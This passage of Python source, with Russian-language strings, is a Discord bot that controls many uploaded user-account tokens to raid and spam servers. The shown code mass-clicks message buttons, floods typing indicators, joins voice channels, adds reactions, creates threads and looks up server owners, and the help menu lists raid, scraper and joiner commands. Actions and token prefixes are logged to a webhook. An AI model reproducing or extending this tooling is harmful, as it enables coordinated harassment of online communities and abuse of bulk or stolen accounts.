                description=f"Row: {btn['row']}, Index: {btn['index']}",
                emoji=btn['emoji'] if btn['emoji'] else None
            ))
            
            embed.add_field(
                name=f"{i+1}. {btn['display_name']}",
                value=f"ID: `{btn['custom_id'][:15]}...`\nПозиция: Ряд {btn['row']+1}, Индекс {btn['index']+1}",
                inline=True
            )
    
    selected_button = None
    
    class ButtonSelector(disnake.ui.View):
        def __init__(self):
            super().__init__()
            self.value = None
        
        @disnake.ui.select(
            placeholder="Выберите кнопку для клика",
            options=options,
            min_values=1,
            max_values=1
        )
        async def select_callback(self, select, interaction):
            selected_index = int(select.values[0])
            self.value = available_buttons[selected_index]
            await interaction.response.edit_message(
                content=f"✅ Выбрана кнопка: **{self.value['display_name']}**\n\nНачинаю клик...",
                embed=None,
                view=None
            )
            self.stop()
    
    view = ButtonSelector()
    await inter.followup.send(embed=embed, view=view, ephemeral=True)
    
    await view.wait()
    
    if view.value is None:
        await inter.followup.send("Время ожидания истекло или выбор не был сделан.", ephemeral=True)
        return
    
    button_info = view.value
    selected_row = button_info['row']
    selected_index = button_info['index']
    selected_custom_id = button_info['custom_id']

    success_count = 0
    tasks = [click_button(token, channel_id, message_id, server_id, selected_custom_id, selected_row, selected_index) for token in valid_tokens]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for token, result in zip(valid_tokens, results):
        if result is True:
            success_count += 1

    result_embed = disnake.Embed(
        title="✅ Обработка завершена",
        color=disnake.Color.green()
    )
    result_embed.add_field(name="Валидных токенов", value=str(len(valid_tokens)), inline=True)
    result_embed.add_field(name="Успешных кликов", value=str(success_count), inline=True)
    result_embed.add_field(name="Ошибок", value=str(len(valid_tokens) - success_count), inline=True)
    
    await inter.followup.send(embed=result_embed, ephemeral=True)
    
    send_to_webhook(
        f"[Результат] {inter.author} выполнил /component_clicker:\n"
        f"Сервер: {server_id}\n"
        f"Канал: {channel_id}\n"
        f"Сообщение: {message_id}\n"
        f"Кнопка: {selected_custom_id}\n"
        f"Токенов: {len(valid_tokens)}\n"
        f"Успехов: {success_count}"
    )

@bot.slash_command(name="ping", description="Показывает пинг бота")
async def ping(inter: disnake.ApplicationCommandInteraction):
    await inter.response.defer(ephemeral=True)
    latency = round(bot.latency * 1000)
    embed = disnake.Embed(title=f'Пинг: {latency}ms', color=disnake.Color.green())
    await inter.edit_original_response(embed=embed)
    send_to_webhook(f'[Инфо] {inter.author} вызвал команду /ping')

@bot.slash_command(name="help", description="Показать список всех доступных команд")
async def help_command(inter: disnake.ApplicationCommandInteraction):
    if await check_protected_guild(inter):
        return
    await inter.response.defer(ephemeral=True)

    embed = disnake.Embed(
        title="📋 Меню помощи",
        description="Список всех доступных команд бота",
        color=disnake.Color.blue(),
        timestamp=datetime.now()
    )
    embed.set_footer(text=f"Запрошено {inter.author}", icon_url=inter.author.avatar.url if inter.author.avatar else None)

    commands_list = [
        ("help", "Показать список всех доступных команд"),
        ("scraper", "Собирает пользователей с сервера\n**Параметры:** `server_id`, `channel_id`, `tokens_file`"),
        ("raid", "Запускает атаки аккаунтами на сервер\n**Параметры:** `server_id`, `channel_id`, `message_text`, `num_pings`, `include_symbols`, `include_emojis`, `use_translation`, `disable_pings`, `tokens_file`"),
        ("joiner", "Заход на сервер по приглашению\n**Параметры:** `invite`, `delay`, `tokens_file`"),
        ("leaver", "Выход из гильдии\n**Параметры:** `guild_id`, `tokens_file`"),
        ("threadcreator", "Создаёт ветки в канале\n**Параметры:** `channel_id`, `name`, `total_threads`, `tokens_file`"),
        ("tokenchecker", "Проверка токенов на валидность\n**Параметры:** `tokens_file`"),
        ("biochanger", "Изменить биографию токенов\n**Параметры:** `bio`, `tokens_file`"),
        ("tokeninfo", "Получить информацию о Discord токене\n**Параметры:** `token`"),
        ("guildinfo", "Получить информацию о Discord сервере\n**Параметры:** `guild_id`, `tokens_file`"),
        ("ping", "Показывает пинг бота"),
        ("vcjoiner", "Подключить токены к голосовому каналу\n**Параметры:** `server_id`, `channel_id`, `tokens_file`"),
        ("hypesquadchanger", "Изменить дом HypeSquad для токенов\n**Параметры:** `tokens_file`, `house` (Храбрость: 1, Блеск: 2, Баланс: 3)"),
        ("reaction", "Добавить или убрать реакции на сообщение\n**Параметры:** `server_id`, `channel_id`, `message_id`, `emoji`, `tokens_file`, `delay`, `remove_reaction`"),
        ("nickchanger", "Изменить никнеймы токенов на сервере\n**Параметры:** `guild_id`, `nickname`, `tokens_file`"),
        ("typer", "Запустить имитацию печати в канале\n**Параметры:** `channel_id`, `tokens_file`"),
        ("button_clicker", "Кликает на кнопку в указанном сообщении\n**Параметры:** `server_id`, `channel_id`, `message_id`, `tokens_file`"),
    ]

    for cmd_name, cmd_desc in commands_list:
        embed.add_field(
            name=f"`/{cmd_name}`",
            value=cmd_desc,
            inline=False
        )

    await inter.edit_original_response(embed=embed)
    send_to_webhook(f'[Инфо] {inter.author} вызвал команду /help')

@bot.slash_command(name="guildinfo", description="Получить информацию о Discord сервере")
async def guildinfo(
    inter: disnake.ApplicationCommandInteraction,
    guild_id: str = disnake_commands.Param(description="ID сервера Discord"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    if await check_protected_guild(inter):
        return
    await inter.response.defer(ephemeral=True)

    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: Загрузите файл .txt")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return

    if not guild_id.isdigit():
        await inter.edit_original_response(content="Ошибка: ID сервера должен быть числом.")
        console.print(f"[error]❌ Неверный формат ID сервера от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Неверный формат ID сервера от {inter.author}')
        return

    file_content = await save_tokens_file(tokens_file, inter.author.name)
    try:
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip()]
        
        if await check_token_count(tokens, inter, inter.author):
            return
    except UnicodeDecodeError:
        await inter.edit_original_response(content="Ошибка: Не удалось декодировать файл (проверь кодировку: UTF-8)")
        console.print(f"[error]❌ Ошибка декодирования файла от {inter.author}[/]")
        send_to_webhook(f"[Ошибка] Ошибка декодирования файла от {inter.author}")
        return

    if not tokens:
        await inter.edit_original_response(content="Ошибка: Файл пустой, нет токенов для проверки.")
        console.print(f"[error]❌ Файл пустой[/]")
        send_to_webhook(f'[Ошибка] Файл пустой от {inter.author}')
        return

    valid_tokens = await validate_tokens(tokens)
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: Не найдено действительных токенов")
        console.print(f"[error]❌ Не найдено действительных токенов от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Не найдено действительных токенов от {inter.author}')
        return

    prep = Prep()
    headers = prep.headers.copy()
    headers['Authorization'] = valid_tokens[0]
    headers['User-Agent'] = random.choice(USER_AGENTS)

    async with aiohttp.ClientSession() as session:
        response = await request("GET", f"https://discord.com/api/v9/guilds/{guild_id}?with_counts=true", headers=headers, timeout=2, retries=6)
        if not response:
            await inter.edit_original_response(content="Ошибка: Не удалось получить данные о сервере (неверный токен или ID)")
            log_error(valid_tokens[0], "guild_info")
            return

        guild_data = response
        owner_response = await request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members/{guild_data['owner_id']}", headers=headers, timeout=2, retries=6)
        owner = owner_response if owner_response else {}

        creation_date = datetime.fromtimestamp(((int(guild_id) >> 22) + 1420070400000) / 1000).strftime('%Y-%m-%d %H:%M:%S')
        result = f"""```
Количество участников: {guild_data['approximate_member_count']} участников
ID сервера: {guild_data['id']}
Название сервера: {guild_data['name']}
Владелец: {owner.get('user', {}).get('username', 'N/A')}#{owner.get('user', {}).get('discriminator', 'N/A')}
ID владельца: {guild_data['owner_id']}
Регион: {guild_data.get('region', 'N/A')}
Бусты: {guild_data.get('premium_subscription_count', 'Н/Д')}
Дата создания: {creation_date}
```"""
        await inter.edit_original_response(content=result)
        console.print(f"[success]✅ Получена информация о сервере {guild_id} для {inter.author}[/]")
        send_to_webhook(f'[Успех] Получена информация о сервере {guild_id} для {inter.author}')

@bot.slash_command(name="typer", description="Запустить имитацию печати в канале")
async def typer(
    inter: disnake.ApplicationCommandInteraction,
    channel_id: str = disnake_commands.Param(description="ID канала"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    if await check_protected_guild(inter):
        return

    if "Windows PowerShell" in channel_id:
        await inter.response.send_message("Ошибка: Нельзя использовать 'Windows PowerShell' в ID канала", ephemeral=True)
        console.print(f"[error]❌ Попытка использовать 'Windows PowerShell' в channel_id от {inter.author}[/]")
        send_to_webhook(f'[Попытка] {inter.author} пытался использовать "Windows PowerShell" в команде /typer')
        return

    send_to_webhook(f'[Команда] Пользователь {inter.author} вызвал /typer с параметрами: channel_id={channel_id}')
    await inter.response.defer(ephemeral=True)

    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: нужен .txt файл")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return

    if not channel_id.isdigit():
        await inter.edit_original_response(content="Ошибка: ID канала должен быть числом.")
        console.print(f"[error]❌ Неверный формат ID канала от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Неверный формат ID канала от {inter.author}')
        return

    file_content = await save_tokens_file(tokens_file, inter.author.name)
    try:
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip()]
        
        if await check_token_count(tokens, inter, inter.author):
            return
    except UnicodeDecodeError:
        await inter.edit_original_response(content="Ошибка: Не удалось декодировать файл (проверь кодировку: UTF-8)")
        console.print(f"[error]❌ Ошибка декодирования файла от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Ошибка декодирования файла от {inter.author}')
        return

    if not tokens:
        await inter.edit_original_response(content="Ошибка: Файл пустой, нет токенов для проверки.")
        console.print(f"[error]❌ Файл пустой[/]")
        send_to_webhook(f'[Ошибка] Файл пустой от {inter.author}')
        return
        
    valid_tokens = await validate_tokens(tokens)
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: нет валидных токенов")
        console.print(f"[error]❌ Не найдено действительных токенов от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Нет валидных токенов в файле {tokens_file.filename} от {inter.author}')
        return

    await inter.edit_original_response(content="Проверяю доступ к каналу...")
    typier = Typier(valid_tokens, channel_id, inter)
    valid_tokens_with_access = await typier.check_channel_access()  
    if not valid_tokens_with_access:
        await inter.edit_original_response(content="Ошибка: у токенов нет доступа к каналу.")
        console.print(f"[error]❌ Имитация печати не выполнена: у токенов нет доступа к каналу {channel_id}[/]")
        send_to_webhook(f"[Ошибка] Имитация печати не выполнена: у токенов нет доступа к каналу {channel_id}")
        return

    success, errors = await typier.run()
    await inter.edit_original_response(content=f"Имитация печати завершена!\n✅ Успешных попыток: {success}\n❌ Ошибок: {errors}", view=None)
    console.print(f"[success]✅ Имитация печати завершена: {success} успешно, {errors} ошибок[/]")
    send_to_webhook(f'[Успех] Имитация печати для {inter.author}: {success} успешно, {errors} ошибок')

class Typier:
    def __init__(self, tokens, channel_id, inter):
        self.tokens = tokens
        self.channel_id = channel_id
        self.inter = inter
        self.success_count = 0
        self.error_count = 0
        self.total_processed = 0
        self.lock = threading.Lock()
        self.is_running = True
        self.stop_flag = False
        self.prep = Prep()
        self.active_tokens = set(tokens)

    async def check_channel_access(self):
        valid_tokens = []
        async with aiohttp.ClientSession() as session:
            tasks = []
            for token in self.active_tokens:
                headers = self.prep.headers.copy()
                headers['Authorization'] = token
                headers['User-Agent'] = random.choice(USER_AGENTS)
                url = f"https://discord.com/api/v9/channels/{self.channel_id}"
                tasks.append(self._check_single_token_access(token, url, headers))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for token, result in zip(self.active_tokens.copy(), results):
                if result is True:
                    valid_tokens.append(token)
                else:
                    console.print(f"[info]ℹ Токен {token[:6]}... исключён из-за отсутствия доступа[/]")
                    send_to_webhook(f"[Инфо] Токен {token[:6]}... исключён из-за отсутствия доступа")
                    self.active_tokens.discard(token)
        return valid_tokens

    async def _check_single_token_access(self, token, url, headers):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=2) as response:
                    if response.status == 200 and (await response.json()).get('id'):
                        console.print(f"[success]✅ Канал {self.channel_id} доступен для токена {token[:6]}...[/]")
                        return True
                    console.print(f"[error]❌ Канал {self.channel_id} недоступен для токена {token[:6]}...[/]")
                    send_to_webhook(f"[Ошибка] Канал {self.channel_id} недоступен для токена {token[:6]}...")
                    return False
        except Exception as e:
            console.print(f"[error]❌ Ошибка проверки доступа для токена {token[:6]}...: {str(e)}[/]")
            send_to_webhook(f"[Ошибка] Ошибка проверки доступа для токена {token[:6]}...: {str(e)}")
            return False

    async def update_status(self, view):
        while self.is_running and not self.stop_flag:
            with self.lock:
                message = (
                    f"Имитация печати...\n"
                    f"✅ Успешных попыток: {self.success_count}\n"
                    f"❌ Ошибок: {self.error_count}\n"
                    f"📊 Токенов задействовано: {self.total_processed}/{len(self.tokens)}"
                )
            try:
                await self.inter.edit_original_response(content=message, view=view)
            except Exception as e:
                console.print(f"[error]❌ Ошибка обновления статуса: {str(e)}[/]")
            await asyncio.sleep(2)

    async def typier(self, token, session):
        headers = self.prep.headers.copy()
        headers['Authorization'] = token
        headers['User-Agent'] = random.choice(USER_AGENTS)
        url = f"https://discord.com/api/v9/channels/{self.channel_id}/typing"
        with self.lock:
            self.total_processed += 1
        response = await request("POST", url, headers=headers, timeout=2, retries=6)
        with self.lock:
            if isinstance(response, aiohttp.ClientResponse) and response.status == 204:
                self.success_count += 1
                console.print(f"[success]✅ Typing успешен для токена {token[:6]}...[/]")
                send_to_webhook(f"[Успех] Typing успешен для токена {token[:6]}...")
            else:
                self.error_count += 1
                reason = "Unknown"
                if response is None:
                    reason = "Request failed after retries"
                elif isinstance(response, aiohttp.ClientResponse):
                    status = response.status
                    if status == 403:
                        reason = "Insufficient permissions"
                    elif status == 404:
                        reason = "Channel not found"
                    elif status == 429:
                        reason = "Rate limit exceeded"
                console.print(f"[error]❌ Ошибка typing для токена {token[:6]}... | Причина: {reason}[/]")
                send_to_webhook(f"[Ошибка] Ошибка typing для токена {token[:6]}... | Причина: {reason}")
                log_error(token, f"typing: {reason}")
                self.active_tokens.discard(token)
                return
        while self.is_running and not self.stop_flag and token in self.active_tokens:
            response = await request("POST", url, headers=headers, timeout=2, retries=6)
            with self.lock:
                if isinstance(response, aiohttp.ClientResponse) and response.status == 204:
                    self.success_count += 1
                    console.print(f"[success]✅ Typing успешен для токена {token[:6]}...[/]")
                    send_to_webhook(f"[Успех] Typing успешен для токена {token[:6]}...")
                else:
                    self.error_count += 1
                    reason = "Unknown"
                    if response is None:
                        reason = "Request failed after retries"
                    elif isinstance(response, aiohttp.ClientResponse):
                        status = response.status
                        if status == 403:
                            reason = "Insufficient permissions"
                        elif status == 404:
                            reason = "Channel not found"
                        elif status == 429:
                            reason = "Rate limit exceeded"
                    console.print(f"[error]❌ Ошибка typing для токена {token[:6]}... | Причина: {reason}[/]")
                    send_to_webhook(f"[Ошибка] Ошибка typing для токена {token[:6]}... | Причина: {reason}")
                    log_error(token, f"typing: {reason}")
                    self.active_tokens.discard(token)
                    return
            await asyncio.sleep(10)

    async def run(self):
        class StopButton(disnake.ui.View):
            def __init__(self, typier_instance):
                super().__init__(timeout=None)
                self.typier = typier_instance

            @disnake.ui.button(label="Остановить", style=disnake.ButtonStyle.red)
            async def stop(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
                if interaction.user.id == self.typier.inter.user.id:
                    self.typier.stop_flag = True
                    self.typier.is_running = False
                    await interaction.response.edit_message(content="Имитация печати остановлена!", view=None)
                    console.print(f"[info]ℹ Имитация печати остановлена пользователем {interaction.user}[/]")
                    send_to_webhook(f'[Инфо] {interaction.user} остановил имитацию печати в канале {self.typier.channel_id}')
                else:
                    await interaction.response.send_message("Вы не можете остановить эту задачу!", ephemeral=True)

        view = StopButton(self)
        status_task = asyncio.create_task(self.update_status(view))
        async with aiohttp.ClientSession() as session:
            batch_size = 30
            for i in range(0, len(self.active_tokens), batch_size): 
                if not self.is_running or self.stop_flag:
                    break
                batch = [token for token in list(self.active_tokens)[i:i + batch_size] if token in self.active_tokens]
                if batch:
                    await asyncio.gather(*[self.typier(token, session) for token in batch])
                    await asyncio.sleep(0.0001) 
        self.is_running = False
        await status_task
        return self.success_count, self.error_count

@bot.slash_command(name="vcjoiner", description="Подключить токены к голосовому каналу")
async def vcjoiner(inter, server_id: str, channel_id: str, tokens_file: disnake.Attachment):
    if await check_protected_guild(inter):
        return
    await inter.response.defer(ephemeral=True)
    
    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: Загрузите файл .txt")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return
    
    if not server_id.isdigit():
        await inter.edit_original_response(content="Ошибка: ID сервера должен быть числом.")
        console.print(f"[error]❌ Неверный формат ID сервера от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Неверный формат ID сервера от {inter.author}')
        return
        
    if not channel_id.isdigit():
        await inter.edit_original_response(content="Ошибка: ID канала должен быть числом.")
        console.print(f"[error]❌ Неверный формат ID канала от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Неверный формат ID канала от {inter.author}')
        return
    
    file_content = await save_tokens_file(tokens_file, inter.author.name)
    try:
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip()]
        
        if await check_token_count(tokens, inter, inter.author):
            return
    except UnicodeDecodeError:
        await inter.edit_original_response(content="Ошибка: Не удалось декодировать файл (проверь кодировку: UTF-8)")
        console.print(f"[error]❌ Ошибка декодирования файла от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Ошибка декодирования файла от {inter.author}')
        return
    
    if not tokens:
        await inter.edit_original_response(content="Ошибка: Файл пустой, нет токенов для проверки.")
        console.print(f"[error]❌ Файл пустой[/]")
        send_to_webhook(f'[Ошибка] Файл пустой от {inter.author}')
        return
    
    valid_tokens = await validate_tokens(tokens)
    
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: Не найдено действительных токенов")
        console.print(f"[error]❌ Не найдено действительных токенов от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Не найдено действительных токенов от {inter.author}')
        return
    
    await inter.edit_original_response(content=f"Подключение {len(valid_tokens)} токенов к голосовому каналу...")
    send_to_webhook(f'[Действие] Попытка подключения {len(valid_tokens)} токенов к голосовому каналу от {inter.author}')
    
    success_count = 0
    error_count = 0

    async def join_vc(token):
        nonlocal success_count, error_count
        try:
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": "windows", "$browser": "Discord", "$device": "desktop"}}}))
            ws.send(json.dumps({"op": 4, "d": {"guild_id": server_id, "channel_id": channel_id, "self_mute": False, "self_deaf": False, "self_video": False}}))
            success_count += 1
            console.print(f"[success]✅ Токен {token[:6]}... подключился к голосовому каналу[/]")
            send_to_webhook(f"[Успех] Токен {token[:6]}... подключился к голосовому каналу")
        except Exception as e:
            error_count += 1
            console.print(f"[error]❌ Ошибка подключения к голосовому каналу токеном {token[:6]}...: {str(e)}[/]")
            send_to_webhook(f"[Ошибка] Ошибка подключения к голосовому каналу токеном {token[:6]}...: {str(e)}")
            log_error(token, "vc_join")

    await asyncio.gather(*[join_vc(token) for token in valid_tokens])
    
    await inter.edit_original_response(content=f"Подключение к голосовому каналу завершено!\n✅ Успешно: {success_count}\n❌ Ошибок: {error_count}")
    console.print(f"[success]✅ Подключение к голосовому каналу завершено: {success_count} успешно, {error_count} ошибок[/]")
    send_to_webhook(f'[Результат] Подключение к голосовому каналу от {inter.author}: {success_count} успешно, {error_count} ошибок')

@bot.slash_command(name="reaction", description="Добавить реакции на сообщение")
async def reaction(
    inter: disnake.ApplicationCommandInteraction,
    server_id: str = disnake_commands.Param(description="ID сервера"),
    channel_id: str = disnake_commands.Param(description="ID канала"),
    message_id: str = disnake_commands.Param(description="ID сообщения"),
    emoji: str = disnake_commands.Param(description="Эмодзи для реакции"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)"),
    delay: float = disnake_commands.Param(description="Задержка между реакциями (сек)", default=0, ge=0),
    remove_reaction: bool = disnake_commands.Param(description="Удалить реакции вместо добавления?", default=False)
):
    if await check_protected_guild(inter):
        return

    await inter.response.defer(ephemeral=True)
    
    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: Загрузите файл .txt")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return
    
    file_content = await save_tokens_file(tokens_file, inter.author.name)
    try:
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip()]
        
        if await check_token_count(tokens, inter, inter.author):
            return
    except UnicodeDecodeError:
        await inter.edit_original_response(content="Ошибка: Не удалось декодировать файл (проверь кодировку: UTF-8)")
        console.print(f"[error]❌ Ошибка декодирования файла от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Ошибка декодирования файла от {inter.author}')
        return
    
    valid_tokens = await validate_tokens(tokens)
    
    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: Не найдено действительных токенов")
        console.print(f"[error]❌ Не найдено действительных токенов от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Не найдено действительных токенов от {inter.author}')
        return
    
    try:
        if emoji.startswith('<') and emoji.endswith('>') and ':' in emoji:
            emoji_parts = emoji.strip('<>').split(':')
            if len(emoji_parts) == 3: 
                emoji_type = emoji_parts[0]
                emoji_name = emoji_parts[1]
                emoji_id = emoji_parts[2]
                emoji_for_url = f"{emoji_name}:{emoji_id}"
            elif len(emoji_parts) == 2: 
                emoji_name = emoji_parts[0]
                emoji_id = emoji_parts[1]
                emoji_for_url = f"{emoji_name}:{emoji_id}"
            else:
                await inter.edit_original_response(content="Ошибка: Неверный формат эмодзи")
                return
        else:
            emoji_for_url = urllib.parse.quote(emoji)
    except Exception as e:
        await inter.edit_original_response(content=f"Ошибка: Неверный формат эмодзи: {str(e)}")
        return
    
    await inter.edit_original_response(content="Проверяю доступ к каналу...")
    valid_tokens_with_access = await check_channel_access(valid_tokens, channel_id)
    
    if not valid_tokens_with_access:
        await inter.edit_original_response(content="Ошибка: у токенов нет доступа к каналу.")
        console.print(f"[error]❌ Реакции не добавлены: у токенов нет доступа к каналу {channel_id}[/]")
        send_to_webhook(f"[Ошибка] Реакции не добавлены: у токенов нет доступа к каналу {channel_id}")
        return
    
    await inter.edit_original_response(content=f"Добавление реакции {emoji} на сообщение...")
    send_to_webhook(f'[Действие] Добавление реакции на сообщение от {inter.author}')
    
    success_count = 0
    error_count = 0
    
    base_url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji_for_url}"
    
    async def add_reaction(token):
        nonlocal success_count, error_count
        headers = {
            'Authorization': token,
            'User-Agent': random.choice(USER_AGENTS)
        }
        
        url = base_url + "/@me"
        method = "DELETE" if remove_reaction else "PUT"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.request(method, url, headers=headers) as response:
                    if response.status in (200, 204):
                        success_count += 1
                        action_text = "удалена" if remove_reaction else "добавлена"
                        console.print(f"[success]✅ Реакция {action_text} токеном {token[:6]}...[/]")
                        return True
                    else:
                        error_text = await response.text()
                        error_count += 1
                        console.print(f"[error]❌ Ошибка {method} реакции токеном {token[:6]}... Статус: {response.status}, Ответ: {error_text}[/]")
                        log_error(token, f"reaction_{method.lower()}: {response.status}")
                        return False
        except Exception as e:
            error_count += 1
            console.print(f"[error]❌ Исключение при {method} реакции токеном {token[:6]}...: {e}[/]")
            log_error(token, f"reaction_{method.lower()}: {str(e)}")
            return False
    
    for i, token in enumerate(valid_tokens_with_access):  
        await add_reaction(token)
        if i < len(valid_tokens_with_access) - 1 and delay > 0:
            await asyncio.sleep(delay)
    
    action_text = "удаления" if remove_reaction else "добавления"
    await inter.edit_original_response(
        content=f"✅ Операция {action_text} реакций завершена:\n"
                f"- Успешно: {success_count}\n"
                f"- Ошибок: {error_count}\n"
                f"- Всего токенов: {len(valid_tokens_with_access)}"
    )
    
    console.print(f"[success]✅ Операция {action_text} реакций завершена: {success_count} успешно, {error_count} ошибок[/]")
    send_to_webhook(f'[Результат] {action_text} реакций от {inter.author}: {success_count} успешно, {error_count} ошибок')

async def check_channel_access(tokens, channel_id):
    valid_tokens = []
    async with aiohttp.ClientSession() as session:
        tasks = []
        for token in tokens:
            headers = {
                'Authorization': token,
                'User-Agent': random.choice(USER_AGENTS)
            }
            url = f"https://discord.com/api/v9/channels/{channel_id}"
            tasks.append(check_single_token_access(token, url, headers, channel_id))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for token, result in zip(tokens, results):
            if result is True:
                valid_tokens.append(token)
            else:
                console.print(f"[info]ℹ Токен {token[:6]}... исключён из-за отсутствия доступа[/]")
                send_to_webhook(f"[Инфо] Токен {token[:6]}... исключён из-за отсутствия доступа")
    return valid_tokens

async def check_single_token_access(token, url, headers, channel_id):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=2) as response:
                if response.status == 200 and (await response.json()).get('id'):
                    console.print(f"[success]✅ Канал {channel_id} доступен для токена {token[:6]}...[/]")
                    return True
                console.print(f"[error]❌ Канал {channel_id} недоступен для токена {token[:6]}...[/]")
                send_to_webhook(f"[Ошибка] Канал {channel_id} недоступен для токена {token[:6]}...")
                return False
    except Exception as e:
        console.print(f"[error]❌ Ошибка проверки доступа для токена {token[:6]}...: {str(e)}[/]")
        send_to_webhook(f"[Ошибка] Ошибка проверки доступа для токена {token[:6]}...: {str(e)}")
        return False
    
class DiscordThreadCreator:
    def __init__(self, tokens, channel_id, name, total_threads, inter):
        self.tokens = tokens
        self.channel_id = channel_id
        self.name = name
        self.total_threads = total_threads
        self.inter = inter
        self.lock = threading.Lock()
        self.success_count = 0
        self.error_count = 0
        self.total_processed = 0
        self.is_running = True
        self.available_tokens = tokens.copy()
        self.prep = Prep()

    async def check_channel_access(self):
        valid_tokens = []
        async with aiohttp.ClientSession() as session:
            tasks = []
            for token in self.available_tokens:
                headers = self.prep.headers.copy()
                headers['Authorization'] = token
                headers['User-Agent'] = random.choice(USER_AGENTS)
                url = f"https://discord.com/api/v9/channels/{self.channel_id}"
                tasks.append(self._check_single_token_access(token, url, headers))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for token, result in zip(self.available_tokens.copy(), results):
                if result is True:
                    valid_tokens.append(token)
                else:
                    console.print(f"[info]ℹ Токен {token[:6]}... исключён из-за отсутствия доступа[/]")
                    send_to_webhook(f"[Инфо] Токен {token[:6]}... исключён из-за отсутствия доступа")
                    self.available_tokens.remove(token)
        return valid_tokens

    async def _check_single_token_access(self, token, url, headers):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=2) as response:
                    if response.status == 200 and (await response.json()).get('id'):
                        console.print(f"[success]✅ Канал {self.channel_id} доступен для токена {token[:6]}...[/]")
                        return True
                    console.print(f"[error]❌ Канал {self.channel_id} недоступен для токена {token[:6]}...[/]")
                    send_to_webhook(f"[Ошибка] Канал {self.channel_id} недоступен для токена {token[:6]}...")
                    return False
        except Exception as e:
            console.print(f"[error]❌ Ошибка проверки доступа для токена {token[:6]}...: {str(e)}[/]")
            send_to_webhook(f"[Ошибка] Ошибка проверки доступа для токена {token[:6]}...: {str(e)}")
            return False

    async def update_status(self):
        while self.is_running:
            with self.lock:
                message = (
                    f"Создание веток...\n"
                    f"✅ Успешно создано: {self.success_count}/{self.total_threads}\n"
                    f"❌ Ошибок: {self.error_count}\n"
                    f"📊 Обработано токенов: {self.total_processed}/{len(self.tokens)}"
                )
            try:
                await self.inter.edit_original_response(content=message)
            except Exception as e:
                console.print(f"[error]❌ Ошибка обновления статуса: {e}[/]")
            await asyncio.sleep(2)

    async def create_thread(self, token):
        headers = self.prep.headers.copy()
        headers['Authorization'] = token
        headers['User-Agent'] = random.choice(USER_AGENTS)
        
        payload = {"name": self.name, "type": 11, "auto_archive_duration": 4320}
        
        try:
            response = await request(
                method="POST",
                url=f"https://discord.com/api/v9/channels/{self.channel_id}/threads",
                payload=payload,
                headers=headers,
                timeout=5,
                retries=3
            )
            
            with self.lock:
                self.total_processed += 1
                if response and isinstance(response, dict) and response.get('id'):
                    self.success_count += 1
                    console.print(f"[success]✅ Ветка создана с помощью токена {token[:6]}...[/]")
                    send_to_webhook(f"[Успех] Ветка создана с помощью токена {token[:6]}...")
                else:
                    self.error_count += 1
                    reason = "Unknown"
                    if isinstance(response, dict):
                        code = response.get('code', 0)
                        if code == 401:
                            reason = "Unauthorized token"
                        elif code == 403:
                            reason = "Insufficient permissions"
                        elif code == 429:
                            reason = "Rate limit exceeded"
                        elif code == 400:
                            reason = response.get('message', "Bad request")
                    console.print(f"[error]❌ Ошибка создания ветки токеном {token[:6]}... | Причина: {reason}[/]")
                    send_to_webhook(f"[Ошибка] Ошибка создания ветки токеном {token[:6]}... | Причина: {reason}")
                    log_error(token, f"thread_create: {reason}")
                    
        except Exception as e:
            with self.lock:
                self.total_processed += 1
                self.error_count += 1
                console.print(f"[error]❌ Исключение при создании ветки токеном {token[:6]}...: {e}[/]")
